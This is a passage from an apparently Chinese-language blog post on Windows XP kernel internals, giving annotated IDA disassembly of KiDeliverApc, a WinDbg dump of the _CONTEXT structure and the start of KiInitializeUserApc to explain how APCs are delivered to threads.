<span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">68h</span><span class="token operator">]</span>                  <span class="token comment">; 获取EIP</span>mov     <span class="token register variable">eax</span>, offset _ExpInterlockedPopEntrySListResume@<span class="token number">0</span> <span class="token comment">; ExpInterlockedPopEntrySListResume()</span>cmp     <span class="token register variable">edx</span>, <span class="token register variable">eax</span>jb      short loc_804FEA54cmp     <span class="token register variable">edx</span>, offset _ExpInterlockedPopEntrySListEnd@<span class="token number">0</span> <span class="token comment">; ExpInterlockedPopEntrySListEnd()</span>ja      short loc_804FEA54mov     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">68h</span><span class="token operator">]</span>, <span class="token register variable">eax</span><span class="token label function">loc_804FEA54:</span>                           <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+D↑j</span>                                        <span class="token comment">; KiDeliverApc(x,x,x)+19↑j</span>                                        <span class="token comment">; KiDeliverApc(x,x,x)+21↑j</span>push    <span class="token register variable">ebx</span>push    <span class="token register variable">esi</span>push    <span class="token register variable">edi</span>mov     <span class="token register variable">eax</span>, large <span class="token register variable">fs</span>:<span class="token number">124h</span>              <span class="token comment">; 获取CurrentThread</span>mov     <span class="token register variable">esi</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">134h</span><span class="token operator">]</span>                 <span class="token comment">; 获取TrapFrame</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_1C<span class="token operator">]</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">44h</span><span class="token operator">]</span>                  <span class="token comment">; 获取Process</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">134h</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>                 <span class="token comment">; 更改TrapFrame</span>lea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">0E8h</span><span class="token operator">]</span>                 <span class="token comment">; SpinLock</span>lea     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>LockHandle<span class="token operator">]</span>           <span class="token comment">; LockHandle</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>BugCheckParameter1<span class="token operator">]</span>, <span class="token register variable">eax</span>call    <span class="token register variable">ds</span>:__imp_@KeAcquireInStackQueuedSpinLock@<span class="token number">8</span> <span class="token comment">; KeAcquireInStackQueuedSpinLock(x,x)</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">49h</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; KernelApcPending置0</span>lea     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">34h</span><span class="token operator">]</span>                  <span class="token comment">; 获取ApcState</span>jmp     loc_804FEB70                    <span class="token comment">; 判断内核APC列表是否为空</span><span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FEA8F:</span>                           <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+144↓j</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">]</span>                      <span class="token comment">; 获取前驱指针</span>lea     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">-</span><span class="token number">0Ch</span><span class="token operator">]</span>                  <span class="token comment">; 获取KAPC结构体</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">14h</span><span class="token operator">]</span>                  <span class="token comment">; 获取KernelRoutine</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_14<span class="token operator">]</span>, <span class="token register variable">ecx</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">1Ch</span><span class="token operator">]</span>                  <span class="token comment">; 获取NormalRoutine，即内核APC函数</span>test    <span class="token register variable">ecx</span>, <span class="token register variable">ecx</span>                        <span class="token comment">; 判断内核函数是否存在</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>, <span class="token register variable">ecx</span>mov     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">20h</span><span class="token operator">]</span>                  <span class="token comment">; 获取NormalContext</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_10<span class="token operator">]</span>, <span class="token register variable">edx</span>mov     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">24h</span><span class="token operator">]</span>                  <span class="token comment">; SystemArgument1</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_C<span class="token operator">]</span>, <span class="token register variable">edx</span>mov     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">28h</span><span class="token operator">]</span>                  <span class="token comment">; SystemArgument2</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_8<span class="token operator">]</span>, <span class="token register variable">edx</span>jnz     short loc_804FEAF2              <span class="token comment">; 内核APC函数存在则跳转</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>mov     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">eax</span>lea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>LockHandle<span class="token operator">]</span>           <span class="token comment">; LockHandle</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">2Eh</span><span class="token operator">]</span>, <span class="token number">0</span>call    <span class="token register variable">ds</span>:__imp_@KeReleaseInStackQueuedSpinLock@<span class="token number">4</span> <span class="token comment">; KeReleaseInStackQueuedSpinLock(x)</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_8<span class="token operator">]</span>                <span class="token comment">; 直接调用KernelRoutine释放APC</span>push    <span class="token register variable">eax</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_C<span class="token operator">]</span>push    <span class="token register variable">eax</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_10<span class="token operator">]</span>push    <span class="token register variable">eax</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>push    <span class="token register variable">eax</span>push    <span class="token register variable">edi</span>call    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_14<span class="token operator">]</span>lea     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>LockHandle<span class="token operator">]</span>           <span class="token comment">; LockHandle</span>lea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">0E8h</span><span class="token operator">]</span>                 <span class="token comment">; SpinLock</span>call    <span class="token register variable">ds</span>:__imp_@KeAcquireInStackQueuedSpinLock@<span class="token number">8</span> <span class="token comment">; KeAcquireInStackQueuedSpinLock(x,x)</span>jmp     short loc_804FEB70              <span class="token comment">; 判断内核APC列表是否为空</span><span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FEAF2:</span>                           <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+86↑j</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">48h</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; 判断KernelApcInProgress</span>jnz     loc_804FEC05cmp     dword ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">0D4h</span><span class="token operator">]</span>, <span class="token number">0</span>         <span class="token comment">; 判断KernelApcDisable</span>jnz     loc_804FEC05mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>                      <span class="token comment">; 从队列中删除当前APC节点</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>mov     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">eax</span>lea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>LockHandle<span class="token operator">]</span>           <span class="token comment">; LockHandle</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">2Eh</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; Inserted置0</span>call    <span class="token register variable">ds</span>:__imp_@KeReleaseInStackQueuedSpinLock@<span class="token number">4</span> <span class="token comment">; KeReleaseInStackQueuedSpinLock(x)</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_8<span class="token operator">]</span>                <span class="token comment">; 参数压栈</span>push    <span class="token register variable">eax</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_C<span class="token operator">]</span>push    <span class="token register variable">eax</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_10<span class="token operator">]</span>push    <span class="token register variable">eax</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>push    <span class="token register variable">eax</span>push    <span class="token register variable">edi</span>call    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_14<span class="token operator">]</span>                    <span class="token comment">; 调用KernelRoutine，释放APC</span>cmp     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>, <span class="token number">0</span>                  <span class="token comment">; 判断NormalRoutine</span>jz      short loc_804FEB5Dxor     <span class="token register variable">cl</span>, <span class="token register variable">cl</span>                          <span class="token comment">; NewIrql</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">48h</span><span class="token operator">]</span>, <span class="token number">1</span>           <span class="token comment">; KernelApcInProgress置1</span>call    <span class="token register variable">ds</span>:__imp_@KfLowerIrql@<span class="token number">4</span>         <span class="token comment">; KfLowerIrql(x)</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_8<span class="token operator">]</span>                     <span class="token comment">; 压入参数</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_C<span class="token operator">]</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_10<span class="token operator">]</span>call    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>                     <span class="token comment">; 调用APC函数</span>mov     <span class="token register variable">cl</span>, <span class="token number">1</span>                           <span class="token comment">; NewIrql</span>call    <span class="token register variable">ds</span>:__imp_@KfRaiseIrql@<span class="token number">4</span>         <span class="token comment">; KfRaiseIrql(x)</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>LockHandle.OldIrql<span class="token operator">]</span>, <span class="token register variable">al</span><span class="token label function">loc_804FEB5D:</span>                           <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+10A↑j</span>lea     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>LockHandle<span class="token operator">]</span>           <span class="token comment">; LockHandle</span>lea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">0E8h</span><span class="token operator">]</span>                 <span class="token comment">; SpinLock</span>call    <span class="token register variable">ds</span>:__imp_@KeAcquireInStackQueuedSpinLock@<span class="token number">8</span> <span class="token comment">; KeAcquireInStackQueuedSpinLock(x,x)</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">48h</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; KernelApcInProgress置0</span><span class="token label function">loc_804FEB70:</span>                           <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+5C↑j</span>                                        <span class="token comment">; KiDeliverApc(x,x,x)+C2↑j</span>cmp     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">]</span>, <span class="token register variable">ebx</span>                      <span class="token comment">; 判断内核APC列表是否为空</span>jnz     loc_804FEA8F                    <span class="token comment">; 获取前驱指针</span>lea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">3Ch</span><span class="token operator">]</span>                  <span class="token comment">; 获取用户APC队列</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">]</span>                      <span class="token comment">; 获取前驱指针</span>cmp     <span class="token register variable">eax</span>, <span class="token register variable">ecx</span>                        <span class="token comment">; 判断链表是否为空</span>jz      loc_804FEC05                    <span class="token comment">; 用户APC队列为空的跳转</span>cmp     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_0<span class="token operator">]</span>, <span class="token number">1</span>                  <span class="token comment">; 判断传入的参数CanUserAPC是否为1</span>jnz     short loc_804FEC05cmp     byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">4Ah</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; 判断UserApcPending</span>jz      short loc_804FEC05mov     byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">4Ah</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; UserApcPending置0</span>lea     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">-</span><span class="token number">0Ch</span><span class="token operator">]</span>                  <span class="token comment">; 获取KAPC</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">1Ch</span><span class="token operator">]</span>                  <span class="token comment">; 获取NormalRoutine</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">14h</span><span class="token operator">]</span>                  <span class="token comment">; 获取KernelRoutine</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>, <span class="token register variable">ecx</span>                <span class="token comment">; NormalRoutine</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">20h</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_10<span class="token operator">]</span>, <span class="token register variable">ecx</span>               <span class="token comment">; NorlamContext</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">24h</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_C<span class="token operator">]</span>, <span class="token register variable">ecx</span>                <span class="token comment">; Arg1</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">28h</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_8<span class="token operator">]</span>, <span class="token register variable">ecx</span>                <span class="token comment">; Arg2</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>                      <span class="token comment">; 添加APC队列</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>mov     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">eax</span>lea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>LockHandle<span class="token operator">]</span>           <span class="token comment">; LockHandle</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">2Eh</span><span class="token operator">]</span>, <span class="token number">0</span>call    <span class="token register variable">ds</span>:__imp_@KeReleaseInStackQueuedSpinLock@<span class="token number">4</span> <span class="token comment">; KeReleaseInStackQueuedSpinLock(x)</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_8<span class="token operator">]</span>                <span class="token comment">; 释放APC</span>push    <span class="token register variable">eax</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_C<span class="token operator">]</span>push    <span class="token register variable">eax</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_10<span class="token operator">]</span>push    <span class="token register variable">eax</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>push    <span class="token register variable">eax</span>push    <span class="token register variable">edi</span>call    <span class="token register variable">ebx</span>cmp     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>, <span class="token number">0</span>                  <span class="token comment">; 判断NormalRoutine</span>jnz     short loc_804FEBEC              <span class="token comment">; 调用KiInitializeUserApc处理用户APC</span>push    <span class="token number">1</span>call    _KeTestAlertThread@<span class="token number">4</span>            <span class="token comment">; KeTestAlertThread(x)</span>jmp     short loc_804FEC0E<span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FEBEC:</span>                           <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+1B3↑j</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_8<span class="token operator">]</span>                     <span class="token comment">; 调用KiInitializeUserApc处理用户APC</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_C<span class="token operator">]</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_10<span class="token operator">]</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_8<span class="token operator">]</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_4<span class="token operator">]</span>call    _KiInitializeUserApc@<span class="token number">24</span>         <span class="token comment">; KiInitializeUserApc(x,x,x,x,x,x)</span>jmp     short loc_804FEC0E<span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FEC05:</span>                           <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+C8↑j</span>                                        <span class="token comment">; KiDeliverApc(x,x,x)+D5↑j</span>                                        <span class="token comment">; KiDeliverApc(x,x,x)+151↑j</span>                                        <span class="token comment">; KiDeliverApc(x,x,x)+15B↑j</span>                                        <span class="token comment">; KiDeliverApc(x,x,x)+161↑j</span>lea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>LockHandle<span class="token operator">]</span>           <span class="token comment">; LockHandle</span>call    <span class="token register variable">ds</span>:__imp_@KeReleaseInStackQueuedSpinLock@<span class="token number">4</span> <span class="token comment">; KeReleaseInStackQueuedSpinLock(x)</span><span class="token label function">loc_804FEC0E:</span>                           <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+1BC↑j</span>                                        <span class="token comment">; KiDeliverApc(x,x,x)+1D5↑j</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>BugCheckParameter1<span class="token operator">]</span>cmp     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">44h</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>jz      short loc_804FEC30mov     <span class="token register variable">eax</span>, large <span class="token register variable">fs</span>:<span class="token number">994h</span>push    <span class="token register variable">eax</span>                             <span class="token comment">; BugCheckParameter4</span>movzx   <span class="token register variable">eax</span>, byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">165h</span><span class="token operator">]</span>push    <span class="token register variable">eax</span>                             <span class="token comment">; BugCheckParameter3</span>push    dword ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">44h</span><span class="token operator">]</span>             <span class="token comment">; BugCheckParameter2</span>push    <span class="token register variable">ecx</span>                             <span class="token comment">; BugCheckParameter1</span>push    <span class="token number">5</span>                               <span class="token comment">; BugCheckCode</span>call    _KeBugCheckEx@<span class="token number">20</span>                <span class="token comment">; KeBugCheckEx(x,x,x,x,x)</span><span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FEC30:</span>                           <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+1E6↑j</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_1C<span class="token operator">]</span>pop     <span class="token register variable">edi</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">134h</span><span class="token operator">]</span>, <span class="token register variable">eax</span>pop     <span class="token register variable">esi</span>pop     <span class="token register variable">ebx</span>leaveretn    <span class="token number">0Ch</span>_KiDeliverApc@<span class="token number">12</span> endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="KiInitializeUserApc"><a href="#KiInitializeUserApc" class="headerlink" title="KiInitializeUserApc"></a>KiInitializeUserApc</h4><p>CONTEXT结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _CONTEXTntdll<span class="token operator">!</span>_CONTEXT   <span class="token operator">+</span><span class="token number">0x000</span> ContextFlags     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x004</span> Dr0              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x008</span> Dr1              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x00c</span> Dr2              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x010</span> Dr3              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x014</span> Dr6              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x018</span> Dr7              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x01c</span> FloatSave        <span class="token operator">:</span> _FLOATING_SAVE_AREA   <span class="token operator">+</span><span class="token number">0x08c</span> SegGs            <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x090</span> SegFs            <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x094</span> SegEs            <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x098</span> SegDs            <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x09c</span> Edi              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0a0</span> Esi              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0a4</span> Ebx              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0a8</span> Edx              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0ac</span> Ecx              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0b0</span> Eax              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0b4</span> Ebp              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0b8</span> Eip              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0bc</span> SegCs            <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0c0</span> EFlags           <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0c4</span> Esp              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0c8</span> SegSs            <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0cc</span> ExtendedRegisters <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span> UChar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数定义：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">KiInitializeUserApc</span><span class="token punctuation">(</span> IN PKEXCEPTION_FRAME ExceptionFrame<span class="token punctuation">,</span>    IN PKTRAP_FRAME TrapFrame<span class="token punctuation">,</span>    IN PKNORMAL_ROUTINE NormalRoutine<span class="token punctuation">,</span>    IN PVOID NormalContext<span class="token punctuation">,</span>    IN PVOID SystemArgument1<span class="token punctuation">,</span>    IN PVOID SystemArgument2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码分析：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">_KiInitializeUserApc@<span class="token number">24</span> proc near       <span class="token comment">; CODE XREF: KiDeliverApc(x,x,x)+1D0↑p</span>ExceptionRecord<span class="token operator">=</span> _EXCEPTION_RECORD ptr <span class="token operator">-</span><span class="token number">34Ch</span>var_2FC<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">2FCh</span>var_2F8<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">2F8h</span>var_2F4<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">2F4h</span>BugCheckParameter3<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">2F0h</span>var_2EC<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">2ECh</span>var_2E8<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">2E8h</span>var_228<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">228h</span>var_224<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">224h</span>var_1C<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">1Ch</span>ms_exc<span 